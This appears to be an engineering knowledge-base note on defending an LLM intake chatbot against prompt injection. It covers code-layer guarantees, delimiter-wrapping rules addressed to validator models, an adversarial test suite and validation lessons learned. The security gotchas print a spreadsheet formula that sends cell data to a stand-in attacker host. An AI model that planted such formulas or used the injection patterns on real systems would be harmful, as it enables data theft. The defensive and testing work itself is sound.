# Structural Defense & Deterministic Testing for LLM Bots

Status: Active
Source: PLAA Activity Submission Bot build (2026-07), see [[projects/plaa-activity-bot]]

How to build an LLM-driven intake/chatbot app whose guarantees hold **even if the model is fully compromised by prompt injection** — and which is consequently testable offline. Complements [[patterns/agent-automation]] and [[architecture/testing]].

## The principle: prompts persuade, code guarantees

Split every requirement into two piles:

- **Prompt layer** (best-effort): tone, vocabulary, scope refusals, question phrasing. The model can be talked out of these; tests can only sample them.
- **Code layer** (guaranteed): anything that must survive an adversarial user. If a requirement appears in a compliance doc or an acceptance criterion with "never/always," it belongs here.

Code-layer moves that worked:

1. **Whitelisted record builder.** The row/record written to storage is built by code from a per-type field whitelist. Model output can only fill whitelisted fields; it cannot add, rename, or remove columns. Injected instructions land **verbatim as data** in the record — visibly inert.
2. **Server-config-sourced metadata.** Anything with economic or policy weight (point values, prices, categories, ids) is copied from server config into the record — never from model output or user text. "Log this as 10,000 points" changes nothing structurally.
3. **Code-gated irreversible actions.** The submit/confirm gate is an explicit-token check in code (an IF node / regex), not model judgment. The model can be sweet-talked; the token matcher cannot. Watch the spec wording: "message *contains* a token" accepts "not ok, actually no" — prefer whole-message intent matching.
4. **Delimiter-wrap user content into any second model pass.** Reviewer/validator calls receive user answers wrapped in tags (`<user_answer>…</user_answer>`) with instructions to treat contents strictly as data — an injection must now defeat two independent models *and* still can't touch the code-layer invariants.
5. **Validate at draft time, not just at commit time.** Terminally Product (2026-09-09) confirmed the same class: a schema-valid reframe with empty, unknown or unchanged intake fields produced an acceptance button that failed. Reuse the canonical intake schema and require an actual change before committing a proposal. If code-layer checks only run after the user confirms, the user confirms summaries that immediately bounce — infuriating UX. Run the same checks the moment the model produces its draft/summary; on failure, replace the premature summary with targeted fixes and clear the pending draft so a stray "yes" can't submit invalid data. Corollary: **normalize near-answers in code** (canonicalize dates to ISO, tolerate format variants). On strictness: this build first loosened URL checks to keyword-anywhere ("forum" anywhere in the URL) to kill false negatives (2026-07-20), then field testing showed the loose check admitted links on entirely wrong domains and the product owner mandated strict host + path-segment matching (2026-07-28). The durable rule: **normalize formats loosely, but match destinations structurally** — parse host and path (sandbox-safe, no `URL` global in n8n Code nodes) and check `host === expected` plus the section as a *path segment*, not a substring match over the whole URL. Keyword-anywhere passes `?type=forum` query strings and `events.` subdomains that are not the required destination.
6. **Bound the blast radius:** output length caps, max-turns-per-session, shared-secret gate before any model call.

## The testing consequence: deterministic-first

Because the guarantees live in code, the interesting tests don't need a model. This build shipped 481 tests with **zero live API calls**:

- **Unit:** whitelist, token gate, verdict-schema validation, routing, constraint checks.
- **Scripted conversation suite:** declarative fixtures (happy path, all-info-up-front, edit loop, non-confirmation) run through the real prompt-assembly + gating + record-builder pipeline with a mocked model layer.
- **Adversarial suite (15+ patterns):** role override, system spoofing, prompt-reveal, instructions embedded in answer fields, value manipulation — asserting **record contents and routing are unchanged**, not asserting model politeness.
- **Compliance scans:** banned-vocabulary greps over config/prompts/UI strings/reply corpora; static + runtime assertions that no payload ever rides in a URL/query string.

Grade the residue honestly: live-model behaviors (does it actually refuse tax questions?) get marked **not-testable-locally** and become the first-hour post-deploy smoke checklist, not silent gaps. Don't fake them with mocked "model" tests that only test the mock.

## One config, N consumers

When the same catalog drives UI metadata, system prompts, and storage schema, make it **one file** consumed by all three, and generate every derived artifact (workflow JSON, sample spreadsheets, prompt blocks) from it via scripts that import the real modules. Hand-edited derived artifacts drift; generated ones can't. Corollary: sample/demo data should be produced by the real record builder, so templates are structurally incapable of disagreeing with production.

## Gotchas (security-review + field-testing)

**The record layer has its own injection surface, downstream of the model.** The structural defenses ("injected text lands verbatim as data") make the bot safe, but "verbatim data in a spreadsheet cell" is itself dangerous.
- *Symptom:* a submission answer or user email like `=IMPORTXML("https://attacker/?x="&A2,"//e")` becomes a **live formula** the moment a reviewer opens the Google Sheet / Excel export — silent data exfiltration or worse.
- *Root cause:* any cell whose value **starts with** `= + - @` (or tab/CR) is executed as a formula; n8n's Sheets node in `USER_ENTERED` mode re-parses values. The non-obvious part: the *primary* vector isn't the wrapped answer (cells that begin with `{`/`Q:` are inert) — it's a **free cell like email**, whose validation regex (`[^\s@]+@…`) happily permits a leading `=`.
- *Resolution / prevention rule:* formula-neutralize **every string cell** (prefix `'` when it starts with a trigger char) in the record builder, as a code-layer guarantee with a test; AND write the sheet in **RAW** mode. Belt and suspenders — do both. Applies to any pipeline that writes user-influenced text into a spreadsheet, CSV, or anything Excel might open.

**"Data as evidence" fights "data minimization."** Orchestrators like n8n default to persisting full execution I/O for debugging.
- *Symptom:* member email, third-party names, and referee emails sit indefinitely in the n8n execution database — a PII-at-rest store *outside* the one access-restricted destination your compliance doc named.
- *Root cause:* `saveDataSuccessExecution: 'all'` (n8n default-ish) persists every input/output. A carefully PII-free *error* workflow doesn't help; the raw success records still hold everything.
- *Prevention rule:* for any workflow handling PII, set `saveDataSuccessExecution: 'none'` (keep errors only if they're PII-free) and state execution-retention explicitly in the runbook. Check this whenever an automation touches regulated/personal data.

**Syntactic validity is not semantic validity — every "parseable" check needs an eligibility window, and every structured field needs an extraction contract.** (Field-testing round, 2026-07-28.)
- *Symptom (dates):* the bot accepted `1999-11-11` as an activity date — `isParseableDate` was true, so the code layer passed it and the model happily summarized it. Separately, a two-digit-year fix mapped `31.12.99` to **2099** and that also passed.
- *Symptom (names):* asked for "first and last name of the first party," the model stored the member's whole sentence ("I introduced Jane Doe to John Smith") verbatim in `contact_a_name` — extraction was implied, never specified.
- *Root cause:* validators were written to the parsing question ("is this a date/string?") not the domain question ("is this a *plausible* date for this program?" / "is this *one person's name*?"). LLMs also don't reliably extract entities into structured fields unless the prompt states the extraction contract explicitly, with an example and a told-to-ask fallback.
- *Prevention rules:* (1) pair every parse check with a domain window in code (e.g. this program settled on date ∈ [now−3mo, now+12mo], per-question `allow_future` flags — expect the window to be a product decision that tightens over time) and pass `now` explicitly so tests stay deterministic; (2) for entity fields, put the extraction example **in the system prompt** ("'I introduced X to Y' → field_a: X, field_b: Y; ask if unsure") *and* add a cheap code backstop (word count / sentence-marker heuristics) since the prompt is best-effort; (3) inject today's date into the prompt so "yesterday"/"last Friday" can be resolved, and mirror it in the normalizer behind an optional `now` param.

**A public shared-secret is an abuse gate, not auth — bound cost in code too.** The token ships in the widget and is scrapeable. CORS + a per-session turn cap aren't enough: nothing caps *sessions*. Add a global in-workflow rate limit (sliding per-minute cap on turns and new sessions, in static data) that trips **before** the first model node, so a scraped token can't run up LLM spend. Real edge/proxy rate limiting is still the production answer; the in-workflow cap is the backstop that ships with the JSON.

### Council enum agreement is not disagreement resolution (Terminally Product, 2026-09-09)
- **Symptom:** three strong panel signals let a chairman's explicit unresolved disagreement reach a final decision without clarification. The first repair still lost six of nine concerns after asking only three: a later model omitted them and passed.
- **Root cause:** first an enum proxy gate, then confusing a bounded presentation batch with the complete durable obligation set. Repeatedly testing one helper with the same in-memory nine-concern object concealed cross-call loss.
- **Resolution:** validate the entire provisional response (schema, evidence, actionable reframe) before retaining its full concern set separately from the final verdict. Merge exact texts and evidence atomically; drain unanswered batches from durable state without relying on the model to repeat them. Include the retained set in later context and final/export validation; preserve text/evidence/answer trace. This implementation explicitly caps nine distinct concerns per framing and forty refs each; overflow preserves prior state and pauses, conflicting provenance rejects, and accepted reframe/confirmed restart intentionally reset the set.
- **Prevention rule:** gate on durable substantive obligations, not proxy enums or the latest model response. A one-question UI may submit a nonempty subset, but validate every submitted ID/value against current obligations before any mutation; reject mixed stale/unknown/blank subsets atomically, retain all unanswered questions, and preserve full-batch callers. Never infer readiness from an emptied displayed slice. The 2026-09-11 corrective review exposed the same loss in adaptive intake: replacing its entire queue with canonical missing-field questions after one answer discarded the remaining model wording and introduced an unasked question. Filter only answered IDs from the persisted queue; generate canonical fallbacks only after exhaustion. Compare exact remaining question objects (not just IDs/counts) across fresh SQL compositions and the single-question browser flow. Test the real application plus PostgreSQL with nine maximum-length concerns, crash after checkpoint, fresh instances across batches, later omission/repetition of only answered concerns, new concern accumulation, atomic overflow, legacy defaults and reset/export paths. Already-discarded historical concerns cannot be reconstructed by adding a default field. This is structural enforcement, not semantic judgment certification.

### Terminal-invalid model checkpoints need a new bounded retry key (Terminally Product, 2026-09-09)
- **Symptom:** explicit learning retry replayed the same malformed response and failed repair, consuming attempt budget without requesting replacement output; contextual code rejection behaved the same way.
- **Root cause:** context/schema/system remained identical and no durable retry discriminator changed.
- **Resolution:** under owner/revision/live lease, terminal-invalid extraction advances the existing bounded recovery discriminator. Provider-unavailable attempts keep their key and resume saved responses/unfinished repairs. When a phase prompt itself changes, include it in that phase's key without perturbing unrelated role keys or deleting historical payloads. Successful candidate replay remains idempotent.
- **Research phase refinement (2026-09-11):** do not throw away successful paid search merely because downstream extraction failed. Preserve the exact frozen operation, version extraction identity, and look up only matching same/one-prior keys. Canonical observed citations can support one-time legacy extraction recovery; subsequent explicit retries retain successful search but discard terminal-invalid extraction in the new attempt, preserving original SQL checkpoints. Never scan unrelated sessions/framings or reuse stale findings. The actual SDK + SQL regression must verify key selection across fresh compositions, no repeated successful search/cached-invalid loop and bounded attempts/usage. A read stub that ignores keys proves parsing only.
- **Prevention rule:** distinguish terminal validation failure from resumable transport failure at the real provider-checkpoint seam. Test malformed+repair, context-invalid selections and connection loss after a saved first response using transport mocks plus real persistence; never claim live quality from these checks.
- **Structured reference variant (2026-09-14):** a complete live premortem was schema-valid but cited `override`, a context field without an evidence ID. The unchanged domain gate correctly rejected it. Derive and serialize the exact permitted all/cited-fact/user-assertion reference sets from the original frozen operation using the existing domain rules; do not remap or delete the invalid reference. Include guidance in checkpoint identity. Explicit terminal-invalid retry changes the bounded retry key, not the original evidence/notes/date; user answers/reframes still deliberately replace context through existing gates. SQL red/green proof changes the clock between attempts and requires byte-identical frozen context with no new knowledge retrieval. Test the anonymized invalid reference still rejects and future/self/source/context IDs are not granted evidence status. Failed provider payloads and their usage remain retained, and a prompt repair is not a guarantee of future semantic compliance.

### Contextual validation and lossless state budgets (Terminally Product, 2026-09-14)
- **Observed:** live PRFAQ JSON passed structure but mixed evidence-reference kinds and contradicted canonical final risk statuses. Intrinsic trace edges also targeted nonexistent internal FAQ sections. Prompt-only allowlists did not reliably enforce contextual invariants.
- **Rule:** run the same domain validator inside the existing single bounded structured-repair window with explicitly parsed, complete frozen validation dependencies, then revalidate in application/export. Preserve human clarification/concern-budget gates without spending a repair. Derive reference/status guidance from canonical evidence and PM/senior decisions; never overwrite an output to force agreement. A sufficient experiment plan is not empirical mitigation.
- **Budget variant:** a normal checkpoint reached500223 characters/501105 UTF-8 bytes because derived stage outputs duplicated canonical role results. Exact lossless alias compaction reduced the candidate to418966 characters without enlarging the500000-character cap. Keep unmatched legacy values, every canonical result, transcript, claim, note and frozen context; reconstruct only public aliases in read views. Deterministic role order must select the final mitigation, not JSON key order.
- **Actionable feedback refinement:** the retained PRFAQ repair repeated one cited-fact statement that also referenced mandatory user intake. Generic unknown_reference did not identify the fix. Emit bounded nested rule/path diagnostics distinguishing unknown IDs from known IDs of an incompatible class; no raw answer/ref values. Preserve rejection at adapter/application/export. A cloned offline kind correction can diagnose the sole blocker, never substitute for actual model output.
- **Checks:** malformed/mixed-kind/status repair, human gates, frozen/blind context, shared deadline; exact public roundtrip/idempotence/unmatched values, normal SQL near-limit recovery and byte-identical exports. Failed provider responses and unknown-cost calls remain evidence, not disposable retry debris.

### Native-cited search prose and strict JSON are different provider phases (Terminally Product, 2026-09-11)
- **Symptom:** a live research review paused generically despite actual web-search results and terminal `end_turn` responses. Structural-only diagnosis found fenced final text with no native citations; no customer text was retained in the diagnosis.
- **Root cause:** a shared “JSON only” system instruction governed both native-cited free-prose search and later schema extraction. The evidence gate correctly rejected an empty native-citation set, but the generic error hid the actionable cause.
- **Resolution:** separate cited-prose and structured-extraction system instructions, include search-phase identity in the durable research key, and retain strict observed-native-citation checks, bounded continuations and one JSON/schema repair. Missing-citation/refusal/truncation/invalid-provider/budget pauses get safe categories; raw errors stay private and provider failures do not manufacture human repair questions.
- **Prevention rule:** test each actual SDK phase, not only successful JSON. Include observed results without native citations, plain-URL spoofing, corrected native-citation success, refused/truncated/malformed outputs, old paused-state explicit retry and preservation of prior SQL checkpoints. Strict whole-document JSON parsing is not indiscriminate substring salvage. Mocked fix validation does not guarantee live citation behavior.

### Exact presentation normalization is not source ownership (Terminally Product, 2026-09-11)
- **Symptom:** a second real research attempt had 17 valid observed native citations but still paused. Both extraction/repair texts were exact whole-response JSON fences; normalization yielded schema-valid objects, then copied-source quote equality failed in 5/4 records.
- **Root cause:** strict JSON parsing confused an exact presentation wrapper with invalid structure, while extraction asked the model to regenerate immutable provider quotes. More prompt pleading would not fix either ownership boundary.
- **Resolution:** normalize only one whole-response lowercase `json` fence with newline boundaries before complete strict parse/schema validation. Reject prose, multiple/malformed fences, non-text, refusal and truncation. Let the model produce findings referencing supplied IDs; attach provider-observed Source records deterministically. Validate legacy ID/URL/title identity, bounds/uniqueness and all finding/category/domain references; altered model copies never replace canonical quotes. Retain native observed-result matching.
- **Prevention rule:** separate presentation, schema, evidence identity and domain gates. Test altered legacy copies, unknown/duplicate IDs, changed URL/title, spoofed native citations, incomplete categories and bounded SQL recovery. Privately replay an actual retained failure only with authorized read-only SQL, no application lease/action, original payloads kept in memory, metadata mocked and all provider transport/new sockets disabled. Emit counts/codes/hashes only, compare user-state/preferences/checkpoints before/after, and never call offline success a fresh live generation. This actual adapter/key/domain replay passed 17 sources/17 findings/3 usage messages with zero provider calls and unchanged rows.

## Multi-agent build note

Building this with parallel agents worked with near-zero interface drift because of one hard rule: **config and shared modules were built first, behind a barrier; the parallel builders and test-writer all coded against those artifacts plus a precise spec.** The only drift found at integration was one hardcoded URL. Precision of the shared spec, not agent count, was the determining variable.

### Experiment thresholds need units, not just numbers (Terminally Product, 2026-09-14)
- **Observed in independent live review:** a two-week usage diary was compared directly with a monthly free allowance; even the senior endorsed the threshold without normalization. A concrete-looking kill rule can still be dimensionally wrong. Sufficient experiment plans are not evidence those experiments succeeded; explicit acceptance is distinct from mitigation.
- **Correction:** general future-role guidance requires a common per-account time unit or a full allowance cycle, disclosed conversion assumptions and seasonality limits. Keep the original generated finding visible; never rewrite an old model result and call it a fresh outcome. Red/green prompt regression verifies emitted guidance, not live semantic compliance.
- **Recovery limit:** after one completed draft plus one terminal-invalid repair, stop. A120s interrupted repair may resume only with explicit paid authority and an offline exact-key proof of first-response reuse and exactly the outstanding repair. A new bounded operation does not erase the prior abort's unknown cost. The actual continuation fixed trailing-comma JSON but still failed a different mixed-provenance field; structural checks correctly refused export.

Pass-2 diagnostic refinement: repeated audit impact inversions survived generic `unranked_assumptions`. Report each increasing adjacency at its exact impact path and each missing top experiment separately; ask to reorder whole records without changing scores/IDs/evidence. Tied impacts pass; SDK regressions require exact feedback and stop after a still-invalid sole repair. In the same run, intrinsic PRFAQ trace errors were repaired only to expose a previously hidden contextual provenance error, and chairman JSON repairs introduced forbidden keys or remained malformed. Do not strip those fields, repair JSON heuristically or raise retry limits. Exact-key offline replay must match the current frozen operation: another context's valid chairman is not resumable evidence. Structural success also missed competitor-affiliation, version/date and unsupported company-action errors in the one completed artifact; native citations prove observed sourcing, not independence, entailment or present business activity.

### One repair needs combined diagnostics; constrained JSON does not prove truth (2026-09-14)
- **Observed:** Terminally Product's PRFAQ repaired intrinsic trace errors only to reveal mixed provenance after its sole repair was spent. A transform after a refined schema cannot see that later contextual defect. Chairman failures also remained malformed JSON or acquired forbidden keys.
- **Correction:** safely parse shape first, collect applicable intrinsic and contextual rule/path diagnostics, then reject together inside the existing single repair. Keep application/export revalidation. The anonymized combined regression simultaneously exercises invalid trace targets, multiple unknown references, multiple provenance fields and canonical risk status; a still-invalid second response still pauses. Never run contextual traversal on malformed shapes or fix evidence by trimming/remapping it.
- **Native format:** investigate the installed official SDK and current documented model capabilities before adopting constrained output. The SDK's schema transform removes unsupported wire constraints, so retain the original local validator. Require explicitly positive Models metadata, fail closed on missing/false support, and keep citation-bearing search prose separate from JSON extraction. Format identity belongs in checkpoint keys; a changed key initially broke a legacy-search-reuse SQL regression and was corrected without loosening the assertion. Native JSON controls syntax, not source entailment or semantic quality.
- **Development evaluation:** source affiliation/date/version, equivalent workload scope, plan-versus-observation, reversible tests/rollback and honest intent-versus-paid-demand remain qualitative review obligations. A prompt-string test proves the instruction exists, not that live output obeys it. Regenerate affected upstream work through normal authorized use cases; never patch a failed artifact or label an offline clone a genuine result.
- **Same-ID restart:** normal restart may delete checkpoints and artifacts. Before an explicitly authorized public-eval-only restart, archive and hash prior state, outputs, checkpoints and unique-message usage; pin the exact journaled ID/revision and require explicit confirmation. Record intent before the one mutation so ambiguous transport does not trigger a duplicate restart. Separate historical usage/unknown costs from fresh-pass totals. No new case, private-session read, larger budget or automatic paid retry is implied.

**Live grammar counterexample (same pass):** SDK transformation of Zod's enum-keyed partial record produced `properties:{},additionalProperties:false`, forcing empty chairman reframe changes despite positive model capability and successful earlier structured roles. Local validation rejected; the one repair exhausted the120s operation and had unknown cost. Replace a finite known key set with explicitly named optional properties, retain strict unknown/own-undefined rejection and all value/refinement bounds, and test transformed populated examples for every affected role. Inventory all role wire schemas for dynamic-key loss and fail before Messages when unsupported. Capability, syntax and local semantics are three different checks. Never increase the budget or reuse/patch the incompatible retained draft; a corrected schema needs a fresh key and separately approved paid request.


**Resolution (pass4):** the recurrent30s establishment timeout was not transport; it was the only wire schema carrying optional parameters (14). Inventory optional/union counts per role before blaming the network; emit optional-heavy records as `[{field,value}]` pairs and convert locally, keeping the canonical record and all gates. Companion lessons: source presence ≠ entailment — check the figure (value-normalized), the entity and the grammatical subject against the cited text; and single-repair feedback must name the reference class and the concrete fix at the exact path, or the repair fixes one field and regresses others.

**Retroactive-gate trap (pass5):** tightening a canonical schema invalidated results the system had already accepted, so every downstream role and both exports failed until length bounds were split into generation-time `drafts` schemas and a `stored` revalidation mode. New constraints belong on new output; accepted history keeps parsing. Companion: deterministic prose gates must be narrowed against live false positives (customer/resource commitment is not a company promise; "no independent corroboration" is a disclosure, not a claim), and repair feedback should hand the model the computed correct value — naming the exact sections that already reference each risk is what made one repair converge.
